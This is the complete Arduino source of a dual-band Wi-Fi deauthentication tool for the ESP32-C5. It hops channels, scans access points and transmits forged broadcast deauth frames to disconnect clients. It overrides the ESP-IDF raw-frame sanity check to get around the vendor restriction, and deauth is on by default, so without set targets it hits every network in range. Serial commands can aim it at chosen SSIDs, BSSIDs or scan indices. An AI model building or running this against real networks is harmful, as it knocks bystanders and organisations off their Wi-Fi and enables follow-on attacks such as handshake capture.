/*-------------------------------------------------------------------------
   Dual‑Band Wi‑Fi Channel Hopper + Deauther (ESP32‑C5 only)
   
   – Supports 2.4 GHz + 5 GHz on ESP32‑C5‑DevKitC‑1
   – RGB WS2812 LED status indicator per stage:
       • Cyan   : system ready
       • Blue   : channel scan in progress
       • Red    : Deauth packet sent (short flash)
       • Yellow : MAC history cleared (flash)
       
   - Tested with Arduino‑ESP32 ≥ v3.3.0‑alpha1
               Made with love by 7h30th3r0n3
---------------------------------------------------------------------------*/

#include <WiFi.h>
#include "esp_wifi.h"
#include <Adafruit_NeoPixel.h>

//change if needed 
int RX_PIN = 6;
int TX_PIN = 7;

/* ---------------------------------------------------------------------------
   ---------------------------  HW Configuration  ---------------------------*/
#define LED_PIN 27 // WS2812 onboard LED (GPIO27 on DevKitC‑1)
Adafruit_NeoPixel led(1, LED_PIN, NEO_GRB + NEO_KHZ800);

/* Color definitions */
#define C_OFF     0
#define C_CYAN    led.Color(  0, 255, 255)
#define C_BLUE    led.Color(  0,   0, 100)
#define C_RED     led.Color(255,   0,   0)
#define C_YELLOW  led.Color(255, 255,   0)

inline void setLed(uint32_t c) {
  led.setPixelColor(0, c);
  led.show();
}

inline void flashLed(uint32_t c, uint16_t t_ms) {
  setLed(c);
  delay(t_ms);
  setLed(C_OFF);
}

/* ---------------------------------------------------------------------------
   ---------------------------  Serial Routing  -----------------------------*/
HardwareSerial SerialUART(1); // UART1 for GPIO 6/7

static void logPrintln() {
  Serial.println();
  SerialUART.println();
}

static void logPrint(const __FlashStringHelper *v) { Serial.print(v); SerialUART.print(v); }
static void logPrint(const String &v) { Serial.print(v); SerialUART.print(v); }
static void logPrint(const char *v) { Serial.print(v); SerialUART.print(v); }
static void logPrint(char v) { Serial.print(v); SerialUART.print(v); }
static void logPrint(int v) { Serial.print(v); SerialUART.print(v); }
static void logPrint(unsigned int v) { Serial.print(v); SerialUART.print(v); }
static void logPrint(long v) { Serial.print(v); SerialUART.print(v); }
static void logPrint(unsigned long v) { Serial.print(v); SerialUART.print(v); }
static void logPrint(uint8_t v) { Serial.print(v); SerialUART.print(v); }

static void logPrintln(const __FlashStringHelper *v) { Serial.println(v); SerialUART.println(v); }
static void logPrintln(const String &v) { Serial.println(v); SerialUART.println(v); }
static void logPrintln(const char *v) { Serial.println(v); SerialUART.println(v); }
static void logPrintln(char v) { Serial.println(v); SerialUART.println(v); }
static void logPrintln(int v) { Serial.println(v); SerialUART.println(v); }
static void logPrintln(unsigned int v) { Serial.println(v); SerialUART.println(v); }
static void logPrintln(long v) { Serial.println(v); SerialUART.println(v); }
static void logPrintln(unsigned long v) { Serial.println(v); SerialUART.println(v); }
static void logPrintln(uint8_t v) { Serial.println(v); SerialUART.println(v); }

/* ---------------------------------------------------------------------------
   -----------------------------  MAC History  ------------------------------*/
#define MAC_HISTORY_LEN 1
struct mac_addr {
  uint8_t b[6];
};

mac_addr mac_history[MAC_HISTORY_LEN] = {};
uint8_t mac_cursor = 0;

void save_mac(const uint8_t *mac) {
  memcpy(mac_history[mac_cursor].b, mac, 6);
  mac_cursor = (mac_cursor + 1) % MAC_HISTORY_LEN;
}

bool already_seen(const uint8_t *mac) {
  for (uint8_t i = 0; i < MAC_HISTORY_LEN; ++i)
    if (!memcmp(mac, mac_history[i].b, 6)) return true;
  return false;
}

void clear_mac_history() {
  memset(mac_history, 0, sizeof(mac_history));
  mac_cursor = 0;
  logPrintln(F("MAC history cleared."));
  flashLed(C_YELLOW, 300);
}

/* ---------------------------------------------------------------------------
   ------------------------  Bypass IDF Frame Check  ------------------------*/
extern "C" int ieee80211_raw_frame_sanity_check(int32_t arg, int32_t, int32_t) {
  return (arg == 31337) ? 1 : 0;
}

/* ---------------------------------------------------------------------------
   ------------------  Convert Security Type to String  ---------------------*/
static const char* security_to_string(wifi_auth_mode_t m) {
  switch (m) {
    case WIFI_AUTH_OPEN: return "OPEN";
    case WIFI_AUTH_WEP: return "WEP";
    case WIFI_AUTH_WPA_PSK: return "WPA_PSK";
    case WIFI_AUTH_WPA2_PSK: return "WPA2_PSK";
    case WIFI_AUTH_WPA_WPA2_PSK: return "WPA/WPA2_PSK";
    case WIFI_AUTH_WPA2_ENTERPRISE: return "WPA2_ENTERPRISE";
    case WIFI_AUTH_WPA3_PSK: return "WPA3_PSK";
    default: return "UNKNOWN";
  }
}

/* ---------------------------------------------------------------------------
   ------------------------  Channel List  ---------------------------------*/
const uint8_t channelList2g[] = {
  1, 2, 3, 4, 5, 6, 7,
  8, 9, 10, 11, 12, 13
};

const uint8_t channelList5g[] = {
  /* 5 GHz – UNII-1 (NO DFS) */
  36, 40, 44, 48,
  /* 5 GHz – UNII-2 (DFS "light") */
  52, 56, 60, 64,
  100, 104, 108, 112,
  /* 5 GHz – UNII-2e (DFS variable) */
  132, 136, 140
};

const size_t CHANNEL_2G_COUNT = sizeof(channelList2g) / sizeof(channelList2g[0]);
const size_t CHANNEL_5G_COUNT = sizeof(channelList5g) / sizeof(channelList5g[0]);
size_t channelIndex = 0;

/* ---------------------------------------------------------------------------
   ------------------------  Runtime Config  -------------------------------*/
const size_t MAX_CHANNELS = 64;
const size_t MAX_APS = 60;
const size_t MAX_TARGET_BSSIDS = 16;
const size_t kMaxSsidLen = 32;

bool scanRunning = true;
bool deauthEnabled = true;
bool manualScanPending = false;

uint8_t activeChannels[MAX_CHANNELS] = {};
size_t activeChannelCount = 0;

bool targetSSIDSet = false;
bool targetBSSIDSet = false;
String targetSSID;
uint8_t targetBSSID[6] = {};
uint8_t targetBSSIDList[MAX_TARGET_BSSIDS][6] = {};
size_t targetBSSIDCount = 0;

enum BandMode { BAND_ALL, BAND_2G, BAND_5G };
BandMode bandMode = BAND_ALL;

struct ApInfo {
  char ssid[kMaxSsidLen + 1];
  uint8_t bssid[6];
  int32_t rssi;
  uint8_t channel;
  wifi_auth_mode_t auth;
};

ApInfo lastScan[MAX_APS] = {};
size_t lastScanCount = 0;
unsigned long lastScanMs = 0;

ApInfo refScan[MAX_APS] = {};
size_t refScanCount = 0;
unsigned long refScanMs = 0;

/* ---------------------------------------------------------------------------
   -------------------------------  Timers  ---------------------------------*/
unsigned long scanInterval = 200;
unsigned long historyReset = 30000;
unsigned long t_lastScan = 0, t_lastClear = 0;

/* ---------------------------------------------------------------------------
   -------------------  Band Selection per Channel  -------------------------*/
#ifndef WIFI_BAND_2G4
#define WIFI_BAND_2G4 WIFI_BAND_2G
#endif

inline void setBandForChannel(uint8_t ch) {
  esp_wifi_set_band((ch <= 14) ? WIFI_BAND_2G4 : WIFI_BAND_5G);
}

/* ---------------------------------------------------------------------------
   -----------------------  Inject Deauth Frame  ----------------------------*/
void sendDeauthPacket(const uint8_t *bssid, uint8_t ch) {
  static const uint8_t tpl[26] PROGMEM = {
    0xC0, 0x00, 0x3A, 0x01,
    0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF,
    0, 0, 0, 0, 0, 0,
    0, 0, 0, 0, 0, 0,
    0x00, 0x00,
    0x07, 0x00
  };
  uint8_t pkt[26];
  memcpy_P(pkt, tpl, 26);
  memcpy(&pkt[10], bssid, 6);
  memcpy(&pkt[16], bssid, 6);
  setBandForChannel(ch);
  esp_wifi_set_channel(ch, WIFI_SECOND_CHAN_NONE);
  for (uint8_t i = 0; i < 10; ++i) {
    esp_wifi_80211_tx(WIFI_IF_STA, pkt, sizeof(pkt), false);
    delay(10);
  }
  flashLed(C_RED, 50);
}

/* ---------------------------------------------------------------------------
   ---------------------------  Serial Helpers  -----------------------------*/
static String serialLine;

static bool parseMac(const String &s, uint8_t out[6]) {
  int vals[6] = {0};
  if (sscanf(s.c_str(), "%x:%x:%x:%x:%x:%x",
             &vals[0], &vals[1], &vals[2], &vals[3], &vals[4], &vals[5]) != 6) {
    return false;
  }
  for (int i = 0; i < 6; ++i) out[i] = (uint8_t)vals[i];
  return true;
}

static void resetActiveChannels() {
  activeChannelCount = 0;
  channelIndex = 0;
  if (bandMode == BAND_ALL || bandMode == BAND_2G) {
    for (size_t i = 0; i < CHANNEL_2G_COUNT && activeChannelCount < MAX_CHANNELS; ++i) {
      activeChannels[activeChannelCount++] = channelList2g[i];
    }
  }
  if (bandMode == BAND_ALL || bandMode == BAND_5G) {
    for (size_t i = 0; i < CHANNEL_5G_COUNT && activeChannelCount < MAX_CHANNELS; ++i) {
      activeChannels[activeChannelCount++] = channelList5g[i];
    }
  }
}

static bool isAllowed2g(uint8_t ch) {
  for (size_t i = 0; i < CHANNEL_2G_COUNT; ++i)
    if (channelList2g[i] == ch) return true;
  return false;
}

static bool isAllowed5g(uint8_t ch) {
  for (size_t i = 0; i < CHANNEL_5G_COUNT; ++i)
    if (channelList5g[i] == ch) return true;
  return false;
}

static bool isAllowedChannel(uint8_t ch) {
  return isAllowed2g(ch) || isAllowed5g(ch);
}

static bool isAllowedByBand(uint8_t ch) {
  if (bandMode == BAND_2G) return isAllowed2g(ch);
  if (bandMode == BAND_5G) return isAllowed5g(ch);
  return isAllowedChannel(ch);
}

static void updateBandModeFromActiveChannels() {
  bool has2g = false;
  bool has5g = false;
  for (size_t i = 0; i < activeChannelCount; ++i) {
    if (activeChannels[i] <= 14) has2g = true;
    else has5g = true;
  }
  if (has2g && has5g) bandMode = BAND_ALL;
  else if (has2g) bandMode = BAND_2G;
  else if (has5g) bandMode = BAND_5G;
}

static bool channelInActive(uint8_t ch) {
  for (size_t i = 0; i < activeChannelCount; ++i)
    if (activeChannels[i] == ch) return true;
  return false;
}

static void addActiveChannel(uint8_t ch) {
  if (activeChannelCount >= MAX_CHANNELS) return;
  if (!isAllowedByBand(ch)) return;
  if (!channelInActive(ch)) {
    activeChannels[activeChannelCount++] = ch;
  }
}

static void addActiveChannelAny(uint8_t ch) {
  if (activeChannelCount >= MAX_CHANNELS) return;
  if (!isAllowedChannel(ch)) return;
  if (!channelInActive(ch)) {
    activeChannels[activeChannelCount++] = ch;
  }
}

static void addChannelsFromList(const String &list, bool replaceAll) {
  if (replaceAll) {
    activeChannelCount = 0;
    channelIndex = 0;
  }
  String tmp = list;
  tmp.replace(" ", "");
  while (tmp.length() > 0) {
    int comma = tmp.indexOf(',');
    String token = (comma >= 0) ? tmp.substring(0, comma) : tmp;
    tmp = (comma >= 0) ? tmp.substring(comma + 1) : "";
    int dash = token.indexOf('-');
    int startCh = 0, endCh = 0;
    if (dash >= 0) {
      startCh = token.substring(0, dash).toInt();
      endCh = token.substring(dash + 1).toInt();
    } else {
      startCh = token.toInt();
      endCh = startCh;
    }
    if (startCh <= 0 || endCh <= 0) continue;
    if (endCh < startCh) {
      int t = startCh; startCh = endCh; endCh = t;
    }
    for (int ch = startCh; ch <= endCh; ++ch) {
      addActiveChannel((uint8_t)ch);
    }
  }
  if (activeChannelCount == 0) resetActiveChannels();
  updateBandModeFromActiveChannels();
}


static void setChannelsFromRefScanForSsid(const String &ssid) {
  if (refScanCount == 0) return;
  activeChannelCount = 0;
  channelIndex = 0;
  for (size_t i = 0; i < refScanCount; ++i) {
    if (ssid == refScan[i].ssid) {
      addActiveChannelAny(refScan[i].channel);
    }
  }
  if (activeChannelCount == 0) return;
  updateBandModeFromActiveChannels();
}

static void setChannelsFromRefScanForBssid(const uint8_t *bssid) {
  if (refScanCount == 0) return;
  activeChannelCount = 0;
  channelIndex = 0;
  for (size_t i = 0; i < refScanCount; ++i) {
    if (memcmp(refScan[i].bssid, bssid, 6) == 0) {
      addActiveChannelAny(refScan[i].channel);
    }
  }
  if (activeChannelCount == 0) return;
  updateBandModeFromActiveChannels();
}

static void setChannelsFromLastScanForBssid(const uint8_t *bssid) {
  if (lastScanCount == 0) return;
  activeChannelCount = 0;
  channelIndex = 0;
  for (size_t i = 0; i < lastScanCount; ++i) {
    if (memcmp(lastScan[i].bssid, bssid, 6) == 0) {
      addActiveChannelAny(lastScan[i].channel);
    }
  }
  if (activeChannelCount == 0) return;
  updateBandModeFromActiveChannels();
}

static void setChannelsFromLastScanForSsid(const String &ssid) {
  if (lastScanCount == 0) return;
  activeChannelCount = 0;
  channelIndex = 0;
  for (size_t i = 0; i < lastScanCount; ++i) {
    if (ssid == lastScan[i].ssid) {
      addActiveChannelAny(lastScan[i].channel);
    }
  }
  if (activeChannelCount == 0) return;
  updateBandModeFromActiveChannels();
}

static bool targetMatch(const String &ssid, const uint8_t *bssid) {
  if (targetBSSIDCount > 0) {
    for (size_t i = 0; i < targetBSSIDCount; ++i) {
      if (memcmp(bssid, targetBSSIDList[i], 6) == 0) return true;
    }
    return false;
  }

  if (targetSSIDSet && ssid != targetSSID) return false;
  if (targetBSSIDSet && memcmp(bssid, targetBSSID, 6) != 0) return false;

  return true;
}


static void printConfig() {
  logPrintln(F("=== Config ==="));
  logPrint(F("scanRunning: ")); logPrintln(scanRunning ? F("ON") : F("OFF"));
  logPrint(F("deauthEnabled: ")); logPrintln(deauthEnabled ? F("ON") : F("OFF"));
  logPrint(F("scanInterval(ms): ")); logPrintln(scanInterval);
  logPrint(F("historyReset(ms): ")); logPrintln(historyReset);
  logPrint(F("targetSSID: ")); logPrintln(targetSSIDSet ? targetSSID : F("(none)"));
  logPrint(F("targetBSSID: "));
  if (targetBSSIDSet) {
    char buf[18];
    sprintf(buf, "%02X:%02X:%02X:%02X:%02X:%02X",
            targetBSSID[0], targetBSSID[1], targetBSSID[2],
            targetBSSID[3], targetBSSID[4], targetBSSID[5]);
    logPrintln(buf);
  } else {
    logPrintln(F("(none)"));
  }
  logPrint(F("targetBSSID list: "));
  logPrintln(targetBSSIDCount);
  logPrint(F("activeChannels("));
  logPrint(activeChannelCount);
  logPrint(F("): "));
  for (size_t i = 0; i < activeChannelCount; ++i) {
    logPrint(activeChannels[i]);
    if (i + 1 < activeChannelCount) logPrint(F(","));
  }
  logPrintln();
  logPrintln(F("================"));
}

static void printHelp() {
  logPrintln(F("Commands:"));
  logPrintln(F("  HELP"));
  logPrintln(F("  START | STOP"));
  logPrintln(F("  SCAN (one channel scan)"));
  logPrintln(F("  SCAN ALL(fast full scan)"));
  logPrintln(F("  LIST (last scan results)"));
  logPrintln(F("  DEAUTH ON|OFF"));
  logPrintln(F("  BAND ALL | 2G | 5G"));
  logPrintln(F("  TARGET SSID <name>"));
  logPrintln(F("  TARGET BSSID <aa:bb:cc:dd:ee:ff>"));
  logPrintln(F("  TARGET INDEX <n,m,o>"));
  logPrintln(F("  TARGET CLEAR"));
  logPrintln(F("  CHAN SET <list> (e.g. 1,6,11,36-48)"));
  logPrintln(F("  CHAN ADD <list>"));
  logPrintln(F("  CHAN RESET | CLEAR | LIST"));
  logPrintln(F("  INTERVAL <ms>  (scan interval)"));
  logPrintln(F("  HISTORY <ms>   (MAC history reset)"));
  logPrintln(F("  CONFIG"));
}

static void listLastScan() {
  logPrint(F("Last scan: "));
  logPrint(lastScanCount);
  logPrint(F(" AP(s) at "));
  logPrint(lastScanMs);
  logPrintln(F(" ms"));
  logPrintln(F("idx | ch | rssi | auth | bssid | ssid"));
  for (size_t i = 0; i < lastScanCount; ++i) {
    const ApInfo &ap = lastScan[i];
    char buf[18];
    sprintf(buf, "%02X:%02X:%02X:%02X:%02X:%02X",
            ap.bssid[0], ap.bssid[1], ap.bssid[2],
            ap.bssid[3], ap.bssid[4], ap.bssid[5]);
    logPrint(i);
    logPrint(F(" | "));
    logPrint(ap.channel);
    logPrint(F(" | "));
    logPrint(ap.rssi);
    logPrint(F(" | "));
    logPrint(security_to_string(ap.auth));
    logPrint(F(" | "));
    logPrint(buf);
    logPrint(F(" | "));
    logPrintln(ap.ssid);
  }
}

static void handleCommand(const String &line) {
  String cmd = line;
  cmd.trim();
  if (cmd.length() == 0) return;

  String upper = cmd;
  upper.toUpperCase();

  /* ---------------- BASIC ---------------- */
  if (upper == "HELP") { printHelp(); return; }

  if (upper == "START") {
    scanRunning = true;
    t_lastClear = millis();
    logPrintln(F("Scan START"));
    return;
  }

  if (upper == "STOP") {
    scanRunning = false;
    logPrintln(F("Scan STOP"));
    return;
  }

  if (upper == "CONFIG") { printConfig(); return; }
  if (upper == "LIST")   { listLastScan(); return; }

  if (upper == "TARGET CLEAR") {
    targetSSIDSet = false;
    targetBSSIDSet = false;
    targetSSID = "";
    targetBSSIDCount = 0;
    logPrintln(F("Targets cleared."));
    return;
  }

  /* ---------------- DEAUTH ---------------- */
  if (upper.startsWith("DEAUTH ")) {
    String arg = cmd.substring(7);
    arg.trim(); arg.toUpperCase();
    deauthEnabled = (arg == "ON");
    logPrint(F("Deauth: "));
    logPrintln(deauthEnabled ? F("ON") : F("OFF"));
    return;
  }

  /* ---------------- TIMING ---------------- */
  if (upper.startsWith("INTERVAL ")) {
    scanInterval = (unsigned long)cmd.substring(9).toInt();
    logPrintln(F("scanInterval updated."));
    return;
  }

  if (upper.startsWith("HISTORY ")) {
    historyReset = (unsigned long)cmd.substring(8).toInt();
    logPrintln(F("historyReset updated."));
    return;
  }

  /* ---------------- BANDS ---------------- */
  if (upper == "BAND ALL") {
    bandMode = BAND_ALL;
    resetActiveChannels();
    logPrintln(F("Band mode: ALL"));
    return;
  }

  if (upper == "BAND 2G") {
    bandMode = BAND_2G;
    resetActiveChannels();
    logPrintln(F("Band mode: 2G"));
    return;
  }

  if (upper == "BAND 5G") {
    bandMode = BAND_5G;
    resetActiveChannels();
    logPrintln(F("Band mode: 5G"));
    return;
  }

  /* ---------------- CHANNELS ---------------- */
  if (upper == "CHAN RESET") {
    resetActiveChannels();
    logPrintln(F("Channels reset."));
    return;
  }

  if (upper == "CHAN CLEAR") {
    activeChannelCount = 0;
    channelIndex = 0;
    logPrintln(F("Channels cleared."));
    return;
  }

  if (upper.startsWith("CHAN SET ")) {
    addChannelsFromList(cmd.substring(9), true);
    logPrintln(F("Channels set."));
    return;
  }

  if (upper.startsWith("CHAN ADD ")) {
    addChannelsFromList(cmd.substring(9), false);
    logPrintln(F("Channels added."));
    return;
  }

  /* ---------------- SCAN ---------------- */
  if (upper == "SCAN") {
    manualScanPending = true;
    logPrintln(F("Manual scan requested."));
    return;
  }

  if (upper == "SCAN ALL") {
    logPrintln(F("Full scan requested (REFERENCE)."));
    refScanCount = 0;
    refScanMs = millis();

    int n = WiFi.scanNetworks(false, true, false, 800, 0);
    for (int i = 0; i < n && refScanCount < MAX_APS; ++i) {
      ApInfo &ap = refScan[refScanCount++];
      memset(ap.ssid, 0, sizeof(ap.ssid));
      WiFi.SSID(i).toCharArray(ap.ssid, sizeof(ap.ssid));
      memcpy(ap.bssid, WiFi.BSSID(i), 6);
      ap.rssi   = WiFi.RSSI(i);
      ap.channel= (uint8_t)WiFi.channel(i);
      ap.auth   = WiFi.encryptionType(i);
    }

    /* refresh lastScan for LIST */
    lastScanCount = 0;
    for (size_t i = 0; i < refScanCount && lastScanCount < MAX_APS; ++i)
      lastScan[lastScanCount++] = refScan[i];
    lastScanMs = refScanMs;

    listLastScan();
    return;
  }

  /* ---------------- TARGETS ---------------- */
  if (upper.startsWith("TARGET SSID ")) {
    targetSSID = cmd.substring(12);
    targetSSID.trim();
    targetSSIDSet = (targetSSID.length() > 0);

    targetBSSIDSet = false;
    targetBSSIDCount = 0;

    logPrint(F("Target SSID: "));
    logPrintln(targetSSIDSet ? targetSSID : F("(none)"));

    if (targetSSIDSet)
      setChannelsFromRefScanForSsid(targetSSID);
    return;
  }

  if (upper.startsWith("TARGET BSSID ")) {
    String mac = cmd.substring(13);
    mac.trim();
    if (parseMac(mac, targetBSSID)) {
      targetBSSIDSet = true;
      targetBSSIDCount = 0;
      logPrintln(F("Target BSSID set."));
      setChannelsFromRefScanForBssid(targetBSSID);
    } else {
      logPrintln(F("Invalid BSSID format."));
    }
    return;
  }

  if (upper.startsWith("TARGET INDEX ")) {
    String list = cmd.substring(13);
    list.replace(" ", "");

    targetBSSIDCount = 0;
    targetSSIDSet = false;
    targetBSSIDSet = false;
    activeChannelCount = 0;
    channelIndex = 0;

    while (list.length() > 0) {
      int comma = list.indexOf(',');
      String token = (comma >= 0) ? list.substring(0, comma) : list;
      list = (comma >= 0) ? list.substring(comma + 1) : "";

      int dash = token.indexOf('-');
      int startIdx = token.toInt();
      int endIdx = startIdx;

      if (dash >= 0) {
        startIdx = token.substring(0, dash).toInt();
        endIdx   = token.substring(dash + 1).toInt();
      }
      if (endIdx < startIdx) { int t = startIdx; startIdx = endIdx; endIdx = t; }

      for (int idx = startIdx; idx <= endIdx; ++idx) {
        if (idx < 0 || (size_t)idx >= refScanCount) continue;
        const ApInfo &ap = refScan[idx];

        bool dup = false;
        for (size_t i = 0; i < targetBSSIDCount; ++i)
          if (!memcmp(targetBSSIDList[i], ap.bssid, 6)) dup = true;

        if (!dup && targetBSSIDCount < MAX_TARGET_BSSIDS)
          memcpy(targetBSSIDList[targetBSSIDCount++], ap.bssid, 6);

        addActiveChannelAny(ap.channel);
      }
    }

    if (targetBSSIDCount == 0) {
      logPrintln(F("No valid index selected (use SCAN ALL first)."));
    } else {
      updateBandModeFromActiveChannels();
      logPrint(F("Target index set: "));
      logPrintln(targetBSSIDCount);
    }
    return;
  }

  logPrintln(F("Unknown command. Type HELP."));
}


/* ---------------------------------------------------------------------------
   -----------------------  Scan and Deauth  -------------------------------*/
static void performScan(bool allowDeauth) {
  if (activeChannelCount == 0) return;

  uint8_t ch = activeChannels[channelIndex];
  setBandForChannel(ch);
  setLed(C_BLUE);

  logPrint(F("Scanning channel : "));
  logPrintln(ch);
  logPrintln(F("==============================="));

  int n = WiFi.scanNetworks(false, true, false, 500, ch);
  lastScanCount = 0;
  lastScanMs = millis();

  if (n > 0) {
    for (int i = 0; i < n; ++i) {

      String ssid = WiFi.SSID(i);
      const uint8_t* bssid = WiFi.BSSID(i);
      int32_t rssi = WiFi.RSSI(i);
      wifi_auth_mode_t auth = WiFi.encryptionType(i);
      uint8_t realCh = (uint8_t)WiFi.channel(i);

      /* =========================================================
         🔥 FILTRAGE EARLY – SSID / BSSID / INDEX
         ========================================================= */
      bool isTarget = targetMatch(ssid, bssid);

      if (targetSSIDSet || targetBSSIDSet || targetBSSIDCount > 0) {
        if (!isTarget) continue;
      }

      /* =========================================================
         Stockage lastScan (FILTRÉ)
         ========================================================= */
      if (lastScanCount < MAX_APS) {
        ApInfo &ap = lastScan[lastScanCount++];
        memset(ap.ssid, 0, sizeof(ap.ssid));
        ssid.toCharArray(ap.ssid, sizeof(ap.ssid));
        memcpy(ap.bssid, bssid, 6);
        ap.rssi   = rssi;
        ap.channel= realCh;
        ap.auth   = auth;
      }

      /* =========================================================
         Affichage (FILTRÉ)
         ========================================================= */
      logPrintln(F("=== Access Point Information ==="));
      logPrint(F("SSID: ")); logPrintln(ssid);
      logPrint(F("BSSID (MAC): ")); logPrintln(WiFi.BSSIDstr(i));
      logPrint(F("Security: ")); logPrintln(security_to_string(auth));
      logPrint(F("RSSI (Signal Strength): ")); logPrint(rssi); logPrintln(F(" dBm"));
      logPrint(F("Channel: ")); logPrintln(realCh);
      logPrintln(F("==============================="));

      /* =========================================================
         Deauth (FILTRÉ + anti-spam MAC)
         ========================================================= */
      if (!allowDeauth) continue;

      if (already_seen(bssid)) {
        logPrintln(String("Already deauthed: ") + WiFi.BSSIDstr(i));
        continue;
      }

      save_mac(bssid);
      sendDeauthPacket(bssid, realCh);
    }
  }

  setLed(C_OFF);
  channelIndex = (channelIndex + 1) % activeChannelCount;
  t_lastScan = millis();
}


/* ---------------------------------------------------------------------------
   -------------------------------- Setup -----------------------------------*/
void setup() {
  Serial.begin(115200);
  SerialUART.begin(115200, SERIAL_8N1, RX_PIN, TX_PIN);
  led.begin();
  led.setBrightness(255);
  setLed(C_CYAN);
  WiFi.mode(WIFI_STA);
  resetActiveChannels();
  logPrintln(F("ESP32‑C5 Dual‑Band Deauth Hopper ready"));
  printHelp();
}


/* ---------------------------------------------------------------------------
   -------------------------------- Loop ------------------------------------*/
void loop() {
  while (Serial.available()) {
    char c = (char)Serial.read();
    if (c == '\n' || c == '\r') {
      handleCommand(serialLine);
      serialLine = "";
    } else {
      if (serialLine.length() < 200) serialLine += c;
    }
  }

  while (SerialUART.available()) {
    char c = (char)SerialUART.read();
    if (c == '\n' || c == '\r') {
      handleCommand(serialLine);
      serialLine = "";
    } else {
      if (serialLine.length() < 200) serialLine += c;
    }
  }

  if (scanRunning && (millis() - t_lastClear > historyReset)) {
    clear_mac_history();
    t_lastClear = millis();
  }

  if (manualScanPending) {
    manualScanPending = false;
    performScan(false);
  }

  if (scanRunning && (millis() - t_lastScan > scanInterval)) {
    performScan(deauthEnabled);
  }
}
